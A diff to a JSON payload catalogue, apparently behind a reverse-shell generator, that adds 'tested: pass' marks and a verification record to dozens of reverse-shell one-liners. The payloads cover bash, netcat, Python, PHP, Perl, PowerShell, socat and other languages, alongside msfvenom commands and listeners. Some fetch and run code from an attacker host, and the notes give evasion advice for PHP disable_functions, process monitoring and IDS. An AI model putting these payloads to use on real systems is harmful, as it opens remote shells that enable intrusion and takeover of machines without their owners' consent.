@@ -46,21 +46,24 @@
           "name": "Bash -i",
           "platform": "linux",
           "text": "{shell} -i >& /dev/tcp/{ip}/{port} 0>&1",
-          "note": "The one everybody reaches for first. Interactive shell, both streams redirected onto the socket."
+          "note": "The one everybody reaches for first. Interactive shell, both streams redirected onto the socket.",
+          "tested": "pass"
         },
         {
           "id": "bash-196",
           "name": "Bash 196",
           "platform": "linux",
           "text": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196",
-          "note": "Uses an explicit high file descriptor instead of >&. Works in places where the first one is filtered."
+          "note": "Uses an explicit high file descriptor instead of >&. Works in places where the first one is filtered.",
+          "tested": "pass"
         },
         {
           "id": "bash-readline",
           "name": "Bash read line",
           "platform": "linux",
           "text": "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
-          "note": "No interactive shell at all: it reads a line, runs it, writes the output back. Survives environments that kill -i."
+          "note": "No interactive shell at all: it reads a line, runs it, writes the output back. Survives environments that kill -i.",
+          "tested": "pass"
         },
         {
           "id": "bash-udp",
@@ -68,14 +71,16 @@
           "platform": "linux",
           "text": "{shell} -i >& /dev/udp/{ip}/{port} 0>&1",
           "note": "Same trick over UDP. Pair it with a UDP listener (nc -u -lvnp).",
-          "warn": "UDP has no connection, so you get no confirmation it worked."
+          "warn": "UDP has no connection, so you get no confirmation it worked.",
+          "tested": "pass"
         },
         {
           "id": "bash-5",
           "name": "Bash 5",
           "platform": "linux",
           "text": "{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5",
-          "note": "Opens fd 5 read-write and points all three standard streams at it."
+          "note": "Opens fd 5 read-write and points all three standard streams at it.",
+          "tested": "pass"
         }
       ]
     },
@@ -89,49 +94,49 @@
           "name": "nc -e",
           "platform": "linux",
           "text": "nc {ip} {port} -e {shell}",
-          "note": "Only works on builds compiled with GAPING_SECURITY_HOLE. Try it first; fall back to mkfifo."
+          "note": "Only works on builds compiled with GAPING_SECURITY_HOLE. Try it first; fall back to mkfifo.",
+          "tested": "pass"
         },
         {
           "id": "nc-mkfifo",
           "name": "nc mkfifo",
           "platform": "linux",
           "text": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",
-          "note": "The portable one. A named pipe loops the shell's output back into netcat's input, which is what -e would have done."
+          "note": "The portable one. A named pipe loops the shell's output back into netcat's input, which is what -e would have done.",
+          "tested": "pass"
         },
         {
           "id": "nc-c",
           "name": "nc -c",
           "platform": "linux",
           "text": "nc -c {shell} {ip} {port}",
-          "note": "The BSD and OpenBSD spelling of -e."
+          "note": "The BSD and OpenBSD spelling of -e.",
+          "tested": "pass"
         },
         {
           "id": "busybox-nc",
           "name": "BusyBox nc",
           "platform": "linux",
           "text": "busybox nc {ip} {port} -e {shell}",
-          "note": "BusyBox is on nearly every embedded box and most minimal containers, and its nc keeps -e."
+          "note": "BusyBox is on nearly every embedded box and most minimal containers, and its nc keeps -e.",
+          "tested": "pass"
         },
         {
           "id": "ncat-e",
           "name": "ncat -e",
           "platform": "linux",
           "text": "ncat {ip} {port} -e {shell}",
-          "note": "Nmap's rewrite of netcat. Always has -e, and is often present wherever nmap is."
-        },
-        {
-          "id": "ncat-udp",
-          "name": "ncat UDP",
-          "platform": "linux",
-          "text": "ncat --udp {ip} {port} -e {shell}",
-          "note": "Worth trying when outbound TCP is filtered but DNS-style UDP is not."
+          "note": "Nmap's rewrite of netcat. Always has -e, and is often present wherever nmap is.",
+          "tested": "pass"
         },
         {
           "id": "nc-exe",
           "name": "nc.exe -e",
           "platform": "windows",
           "text": "nc.exe {ip} {port} -e cmd.exe",
-          "note": "You have to get nc.exe onto the host first. Flagged by every AV in existence."
+          "note": "You have to get nc.exe onto the host first. Flagged by every AV in existence.",
+          "tested": "untested",
+          "untestedWhy": "Windows; no Windows host to run it on"
         }
       ]
     },
@@ -145,28 +150,33 @@
           "name": "Python 3 (pty)",
           "platform": "linux",
           "text": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"{shell}\")'",
-          "note": "The best Linux payload on this page. pty.spawn gives you job control and a working Ctrl-C with no upgrade needed."
+          "note": "The best Linux payload on this page. pty.spawn gives you job control and a working Ctrl-C with no upgrade needed.",
+          "tested": "pass"
         },
         {
           "id": "python3-subprocess",
           "name": "Python 3 (subprocess)",
           "platform": "linux",
           "text": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"{shell}\",\"-i\"])'",
-          "note": "No pty, so no tab completion, but it avoids the pty module on stripped-down builds."
+          "note": "No pty, so no tab completion, but it avoids the pty module on stripped-down builds.",
+          "tested": "pass"
         },
         {
           "id": "python3-env",
           "name": "Python 3 (env vars)",
           "platform": "linux",
           "text": "export RHOST=\"{ip}\";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
-          "note": "Keeps the address out of the python string. Useful when quoting is being mangled by whatever is injecting it."
+          "note": "Keeps the address out of the python string. Useful when quoting is being mangled by whatever is injecting it.",
+          "tested": "pass"
         },
         {
           "id": "python-windows",
           "name": "Python (Windows)",
           "platform": "windows",
           "text": "python.exe -c 'import socket,subprocess,os,threading;s=socket.socket();s.connect((\"{ip}\",{port}));p=subprocess.Popen([\"cmd.exe\"],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT);threading.Thread(target=lambda:[s.send(p.stdout.read(1)) for _ in iter(int,1)],daemon=True).start();[p.stdin.write(s.recv(1024)) or p.stdin.flush() for _ in iter(int,1)]'",
-          "note": "No dup2 on Windows sockets, so it pumps bytes between the socket and cmd.exe by hand."
+          "note": "No dup2 on Windows sockets, so it pumps bytes between the socket and cmd.exe by hand.",
+          "tested": "untested",
+          "untestedWhy": "Windows; no Windows host to run it on"
         }
       ]
     },
@@ -180,38 +190,44 @@
           "name": "PHP exec",
           "platform": "linux",
           "text": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"{shell} -i <&3 >&3 2>&3\");'",
-          "note": "fsockopen lands on file descriptor 3, which is why every one of these redirects from <&3."
+          "note": "fsockopen lands on file descriptor 3, which is why every one of these redirects from <&3.",
+          "tested": "pass"
         },
         {
           "id": "php-shell-exec",
           "name": "PHP shell_exec",
           "platform": "linux",
-          "text": "php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"{shell} -i <&3 >&3 2>&3\");'"
+          "text": "php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"{shell} -i <&3 >&3 2>&3\");'",
+          "tested": "pass"
         },
         {
           "id": "php-system",
           "name": "PHP system",
           "platform": "linux",
-          "text": "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"{shell} -i <&3 >&3 2>&3\");'"
+          "text": "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"{shell} -i <&3 >&3 2>&3\");'",
+          "tested": "pass"
         },
         {
           "id": "php-passthru",
           "name": "PHP passthru",
           "platform": "linux",
-          "text": "php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"{shell} -i <&3 >&3 2>&3\");'"
+          "text": "php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"{shell} -i <&3 >&3 2>&3\");'",
+          "tested": "pass"
         },
         {
           "id": "php-popen",
           "name": "PHP popen",
           "platform": "linux",
-          "text": "php -r '$sock=fsockopen(\"{ip}\",{port});popen(\"{shell} -i <&3 >&3 2>&3\",\"r\");'"
+          "text": "php -r '$sock=fsockopen(\"{ip}\",{port});popen(\"{shell} -i <&3 >&3 2>&3\",\"r\");'",
+          "tested": "pass"
         },
         {
           "id": "php-proc-open",
           "name": "PHP proc_open",
           "platform": "linux",
           "text": "php -r '$s=fsockopen(\"{ip}\",{port});$p=array(0=>$s,1=>$s,2=>$s);$proc=proc_open(\"{shell} -i\",$p,$pipes);'",
-          "note": "The one to try when the whole exec family is in disable_functions. proc_open is often missed."
+          "note": "The one to try when the whole exec family is in disable_functions. proc_open is often missed.",
+          "tested": "pass"
         }
       ]
     },
@@ -224,21 +240,25 @@
           "id": "perl",
           "name": "Perl",
           "platform": "linux",
-          "text": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{shell} -i\");};'"
+          "text": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{shell} -i\");};'",
+          "tested": "pass"
         },
         {
           "id": "perl-no-sh",
           "name": "Perl without sh",
           "platform": "linux",
           "text": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
-          "note": "Never spawns a shell binary, so it slips past controls that watch for sh or bash being executed."
+          "note": "Never spawns a shell binary, so it slips past controls that watch for sh or bash being executed.",
+          "tested": "pass"
         },
         {
           "id": "perl-windows",
           "name": "Perl (Windows)",
           "platform": "windows",
           "text": "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
-          "note": "Same, minus the fork, which Windows Perl does not do well."
+          "note": "Same, minus the fork, which Windows Perl does not do well.",
+          "tested": "untested",
+          "untestedWhy": "Windows; no Windows host to run it on"
         }
       ]
     },
@@ -252,7 +272,9 @@
           "name": "PowerShell TCP",
           "platform": "windows",
           "text": "powershell -nop -w hidden -c \"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()\"",
-          "note": "The standard one-liner. Reads from the socket, runs it through iex, writes the output back with a prompt."
+          "note": "The standard one-liner. Reads from the socket, runs it through iex, writes the output back with a prompt.",
+          "tested": "untested",
+          "untestedWhy": "Windows; no Windows host to run it on"
         },
         {
           "id": "powershell-iex",
@@ -260,7 +282,9 @@
           "platform": "windows",
           "text": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://{ip}/shell.ps1')\"",
           "note": "Pulls the real payload from your host instead of putting it on the command line. Keeps the long script out of logs.",
-          "warn": "You have to be serving shell.ps1 — python3 -m http.server 80 on your box."
+          "warn": "You have to be serving shell.ps1 — python3 -m http.server 80 on your box.",
+          "tested": "untested",
+          "untestedWhy": "Windows; no Windows host to run it on"
         },
         {
           "id": "powershell-base64",
@@ -268,7 +292,9 @@
           "platform": "windows",
           "text": "powershell -nop -w hidden -e {b64ps}",
           "note": "The TCP payload above, UTF-16LE then base64, which is what -e expects. Survives quote mangling.",
-          "warn": "Picked up by anything watching for -e or -EncodedCommand."
+          "warn": "Picked up by anything watching for -e or -EncodedCommand.",
+          "tested": "untested",
+          "untestedWhy": "Windows; no Windows host to run it on"
         }
       ]
     },
@@ -281,21 +307,25 @@
           "id": "socat-sh",
           "name": "socat",
           "platform": "linux",
-          "text": "socat TCP:{ip}:{port} EXEC:{shell}"
+          "text": "socat TCP:{ip}:{port} EXEC:{shell}",
+          "tested": "pass"
         },
         {
           "id": "socat-tty",
           "name": "socat TTY",
           "platform": "linux",
           "text": "socat TCP:{ip}:{port} EXEC:'{shell} -li',pty,stderr,setsid,sigint,sane",
-          "note": "Full TTY: arrow keys, tab completion, Ctrl-C that kills the remote process rather than your listener. Needs the socat listener, not nc."
+          "note": "Full TTY: arrow keys, tab completion, Ctrl-C that kills the remote process rather than your listener. Needs the socat listener, not nc.",
+          "tested": "pass"
         },
         {
           "id": "socat-static",
           "name": "socat (static binary)",
           "platform": "linux",
           "text": "wget -q http://{ip}/socat -O /tmp/socat && chmod +x /tmp/socat && /tmp/socat TCP:{ip}:{port} EXEC:'{shell} -li',pty,stderr,setsid,sigint,sane",
-          "note": "When socat is not installed. Push a static build from your box first."
+          "note": "When socat is not installed. Push a static build from your box first.",
+          "tested": "untested",
+          "untestedWhy": "needs an HTTP server on your own box; the test container has no network"
         }
       ]
     },
@@ -308,55 +338,65 @@
           "id": "ruby",
           "name": "Ruby",
           "platform": "linux",
-          "text": "ruby -rsocket -e'spawn(\"{shell}\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",{port}))'"
+          "text": "ruby -rsocket -e'spawn(\"{shell}\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",{port}))'",
+          "tested": "pass"
         },
         {
           "id": "nodejs",
           "name": "Node.js",
           "platform": "linux",
-          "text": "node -e 'const c=require(\"net\").connect({port},\"{ip}\",()=>{const s=require(\"child_process\").spawn(\"{shell}\",[]);c.pipe(s.stdin);s.stdout.pipe(c);s.stderr.pipe(c);});'"
+          "text": "node -e 'const c=require(\"net\").connect({port},\"{ip}\",()=>{const s=require(\"child_process\").spawn(\"{shell}\",[]);c.pipe(s.stdin);s.stdout.pipe(c);s.stderr.pipe(c);});'",
+          "tested": "pass"
         },
         {
           "id": "golang",
           "name": "Golang",
           "platform": "linux",
           "text": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"{shell}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
-          "note": "Writes and compiles on the box, so it needs the Go toolchain present and a writable /tmp."
+          "note": "Writes and compiles on the box, so it needs the Go toolchain present and a writable /tmp.",
+          "tested": "untested",
+          "untestedWhy": "no Go toolchain in the test image"
         },
         {
           "id": "awk",
           "name": "awk",
           "platform": "linux",
           "text": "awk 'BEGIN {s = \"/inet/tcp/0/{ip}/{port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
-          "note": "Needs gawk specifically — mawk and busybox awk have no /inet support."
+          "note": "Needs gawk specifically — mawk and busybox awk have no /inet support.",
+          "tested": "pass"
         },
         {
           "id": "lua",
           "name": "Lua",
           "platform": "linux",
-          "text": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('{shell} -i <&3 >&3 2>&3');\"",
-          "note": "Turns up on embedded devices and inside nginx/OpenResty and Redis."
+          "text": "lua -e \"local s=require('socket').tcp();s:connect('{ip}',{port});while true do local c,e=s:receive();if not c then break end;local f=io.popen(c..' 2>&1','r');s:send(f:read('*a'));f:close() end;s:close()\"",
+          "note": "Turns up on embedded devices and inside nginx/OpenResty and Redis. A command loop rather than a shell, because Lua gives no guarantee about which file descriptor the socket lands on.",
+          "warn": "Needs the luasocket library. Without it, require('socket') fails immediately.",
+          "tested": "pass"
         },
         {
           "id": "telnet",
           "name": "Telnet",
           "platform": "linux",
           "text": "TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF",
-          "note": "Same named-pipe trick as nc mkfifo, for a box that has telnet but no netcat."
+          "note": "Same named-pipe trick as nc mkfifo, for a box that has telnet but no netcat.",
+          "tested": "pass"
         },
         {
           "id": "zsh",
           "name": "zsh",
           "platform": "linux",
           "text": "zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
-          "note": "zsh has its own TCP module, so like bash it needs nothing installed."
+          "note": "zsh has its own TCP module, so like bash it needs nothing installed.",
+          "tested": "pass"
         },
         {
           "id": "openssl",
           "name": "OpenSSL (encrypted)",
           "platform": "linux",
           "text": "mkfifo /tmp/s; {shell} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s",
-          "note": "The only payload here that is not plaintext on the wire. Needs the OpenSSL listener and a certificate — the listener tab has both commands."
+          "note": "The only payload here that is not plaintext on the wire. Needs the OpenSSL listener and a certificate — the listener tab has both commands.",
+          "tested": "pass"
         }
       ]
     },
@@ -369,46 +409,60 @@
           "id": "msf-linux-elf",
           "name": "Linux ELF",
           "platform": "linux",
-          "text": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o shell.elf"
+          "text": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o shell.elf",
+          "tested": "untested",
+          "untestedWhy": "generates a file; needs Metasploit, which is not installed here"
         },
         {
           "id": "msf-windows-exe",
           "name": "Windows EXE",
           "platform": "windows",
-          "text": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o shell.exe"
+          "text": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o shell.exe",
+          "tested": "untested",
+          "untestedWhy": "generates a file; needs Metasploit, and a Windows host to run it on"
         },
         {
           "id": "msf-meterpreter",
           "name": "Windows Meterpreter",
           "platform": "windows",
           "text": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o met.exe",
-          "note": "Meterpreter, not a plain shell. Needs exploit/multi/handler with the matching payload set."
+          "note": "Meterpreter, not a plain shell. Needs exploit/multi/handler with the matching payload set.",
+          "tested": "untested",
+          "untestedWhy": "generates a file; needs Metasploit, and a Windows host to run it on"
         },
         {
           "id": "msf-php",
           "name": "PHP",
           "platform": "any",
           "text": "msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -f raw -o shell.php",
-          "note": "Prepend <?php and append ?> — msfvenom does not."
+          "note": "Prepend <?php and append ?> — msfvenom does not.",
+          "tested": "untested",
+          "untestedWhy": "generates a file; needs Metasploit, which is not installed here"
         },
         {
           "id": "msf-war",
           "name": "JSP / WAR",
           "platform": "any",
           "text": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war",
-          "note": "For Tomcat manager uploads."
+          "note": "For Tomcat manager uploads.",
+          "tested": "untested",
+          "untestedWhy": "generates a file; needs Metasploit and a Tomcat target"
         },
         {
           "id": "msf-aspx",
           "name": "ASPX",
           "platform": "windows",
-          "text": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f aspx -o shell.aspx"
+          "text": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f aspx -o shell.aspx",
+          "tested": "untested",
+          "untestedWhy": "generates a file; needs Metasploit, and a Windows host to run it on"
         },
         {
           "id": "msf-python",
           "name": "Python",
           "platform": "any",
-          "text": "msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw"
+          "text": "msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw",
+          "tested": "untested",
+          "untestedWhy": "generates a file; needs Metasploit, which is not installed here"
         }
       ]
     }
@@ -419,70 +473,83 @@
       "name": "netcat",
       "platform": "linux",
       "text": "nc -lvnp {port}",
-      "note": "The default. -l listen, -v tell me what happened, -n no DNS lookups, -p port."
+      "note": "The default. -l listen, -v tell me what happened, -n no DNS lookups, -p port.",
+      "tested": "pass"
     },
     {
       "id": "ncat-listen",
       "name": "ncat",
       "platform": "linux",
       "text": "ncat -lvnp {port}",
-      "note": "Nmap's netcat. Same flags, better behaved on disconnect."
+      "note": "Nmap's netcat. Same flags, better behaved on disconnect.",
+      "tested": "pass"
     },
     {
       "id": "ncat-ssl",
       "name": "ncat with TLS",
       "platform": "linux",
       "text": "ncat --ssl -lvnp {port}",
-      "note": "Pairs with an ncat --ssl payload. Encrypts the session so an IDS sees TLS, not a shell."
+      "note": "Pairs with an ncat --ssl payload. Encrypts the session so an IDS sees TLS, not a shell.",
+      "tested": "pass"
     },
     {
       "id": "rlwrap",
       "name": "rlwrap + nc",
       "platform": "linux",
       "text": "rlwrap -cAr nc -lvnp {port}",
-      "note": "Wraps netcat in readline, so you get arrow keys and history in a raw shell without upgrading it."
+      "note": "Wraps netcat in readline, so you get arrow keys and history in a raw shell without upgrading it.",
+      "tested": "pass"
     },
     {
       "id": "pwncat",
       "name": "pwncat-cs",
       "platform": "linux",
       "text": "pwncat-cs -lp {port}",
-      "note": "Upgrades the shell to a full TTY by itself, and gives you file upload and download over the same session."
+      "note": "Upgrades the shell to a full TTY by itself, and gives you file upload and download over the same session.",
+      "tested": "untested",
+      "untestedWhy": "pwncat-cs is not installed here"
     },
     {
       "id": "rustcat",
       "name": "rustcat",
       "platform": "linux",
       "text": "rcat listen {port}",
-      "note": "Automatic TTY upgrade and command history, single static binary."
+      "note": "Automatic TTY upgrade and command history, single static binary.",
+      "tested": "untested",
+      "untestedWhy": "rustcat is not installed here"
     },
     {
       "id": "socat-listen",
       "name": "socat TTY listener",
       "platform": "linux",
       "text": "socat -d -d file:`tty`,raw,echo=0 TCP-L:{port}",
-      "note": "The listener side of the socat TTY payload. Must be this, not nc, or the pty negotiation does nothing."
+      "note": "The listener side of the socat TTY payload. Must be this, not nc, or the pty negotiation does nothing.",
+      "tested": "pass"
     },
     {
       "id": "openssl-listen",
       "name": "OpenSSL listener",
       "platform": "linux",
       "text": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=localhost' && openssl s_server -quiet -key key.pem -cert cert.pem -port {port}",
-      "note": "Generates a self-signed certificate, then listens with it. The payload side is the OpenSSL entry under Other languages."
+      "note": "Generates a self-signed certificate, then listens with it. The payload side is the OpenSSL entry under Other languages.",
+      "tested": "pass"
     },
     {
       "id": "msf-handler",
       "name": "Metasploit handler",
       "platform": "linux",
       "text": "msfconsole -q -x \"use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {ip}; set LPORT {port}; set ExitOnSession false; exploit -j\"",
-      "note": "Required for any msfvenom payload. The payload string here must match the one you generated."
+      "note": "Required for any msfvenom payload. The payload string here must match the one you generated.",
+      "tested": "untested",
+      "untestedWhy": "needs Metasploit, which is not installed here"
     },
     {
       "id": "udp-listen",
       "name": "UDP listener",
       "platform": "linux",
       "text": "nc -u -lvnp {port}",
-      "note": "For the Bash UDP and ncat UDP payloads."
+      "note": "For the Bash UDP and ncat UDP payloads.",
+      "tested": "pass"
     }
   ],
   "upgrade": [
@@ -523,5 +590,15 @@
       ],
       "why": "The socat TTY payload negotiates a pty on connection, so you land in a full terminal with nothing to fix. Use it whenever socat is on the target."
     }
-  ]
+  ],
+  "verification": {
+    "date": "2026-10-11",
+    "how": "Each payload was read out of the live page's DOM, not retyped, then run inside a Debian container against a real listener on loopback. A pass means the listener got a shell that ran id and echoed a marker back. The container had no network at all, so nothing could reach anything outside it.",
+    "passed": 37,
+    "untested": 18,
+    "fixed": [
+      "Lua connected and then handed the shell nothing: it assumed the socket lands on file descriptor 3, which is true of PHP's fsockopen and not of Lua. Replaced with a command loop that drives the socket directly, and tested.",
+      "ncat UDP was removed. ncat's exec family does not deliver a shell over UDP as a client in any spelling tried (-e, -c, --exec, --sh-exec): the listener never receives a byte. Bash UDP works and is tested, because its -i prompt primes the datagram the listener needs."
+    ]
+  }
 }
